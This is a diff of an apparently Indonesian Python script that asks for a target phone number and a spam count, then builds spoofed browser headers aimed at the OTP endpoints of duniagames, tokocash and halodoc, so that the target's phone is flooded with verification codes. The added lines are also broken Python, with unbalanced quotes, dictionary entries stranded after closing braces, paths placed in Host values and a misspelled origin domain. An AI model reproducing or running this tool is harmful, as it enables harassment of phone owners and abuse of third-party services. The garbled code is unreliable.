@@ -84,7 +84,7 @@ mr_dark1=input('  \033[31m➤ \033[1;37mTarget Phone Number \033[31m: ')
 jumlah=int(input('  \033[31m➤ \033[1;37mJumlah Spam \033[31m: '))
 print (" \033[1;30m<═════════════════════════════════════════════>")
 mr_f={
-'Host':'api.duniagames.co.id','www.tokocash.com/oauth/otp','www.halodoc.com/oauth/otp,
+'Host':'api.duniagames.co.id',
 'content-length':'50',
 'accept':'application/json, text/plain, */*',
 'sec-ch-ua-mobile':'?0',
@@ -95,7 +95,37 @@ mr_f={
 'sec-fetch-site':'same-site',
 'sec-fetch-mode':'cors',
 'sec-fetch-dest':'empty',
-'referer':'https://duniagames.co.id/','https://tokocash.com/','https://halodoc.com/',
+'referer':'https://duniagames.co.id/','
+'accept-encoding':'gzip, deflate, br',
+'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+}
+'Host':'www.tokocash.com/oauth/otp',
+'content-length':'50',
+'accept':'application/json, text/plain, */*',
+'sec-ch-ua-mobile':'?0',
+'save-data':'on',
+'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
+'content-type':'application/json',
+'origin':'https://www.tokocaash.com',
+'sec-fetch-site':'same-site',
+'sec-fetch-mode':'cors',
+'sec-fetch-dest':'empty',
+'referer':'https://tokocash.com/',
+'accept-encoding':'gzip, deflate, br',
+'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
+}
+'Host':'www.halodoc.com/oauth/otp,
+'content-length':'50',
+'accept':'application/json, text/plain, */*',
+'sec-ch-ua-mobile':'?0',
+'save-data':'on',
+'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
+'content-type':'application/json',
+'origin':'https://www.halodoc.com',
+'sec-fetch-site':'same-site',
+'sec-fetch-mode':'cors',
+'sec-fetch-dest':'empty',
+'referer':'https://halodoc.com/',
 'accept-encoding':'gzip, deflate, br',
 'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 }
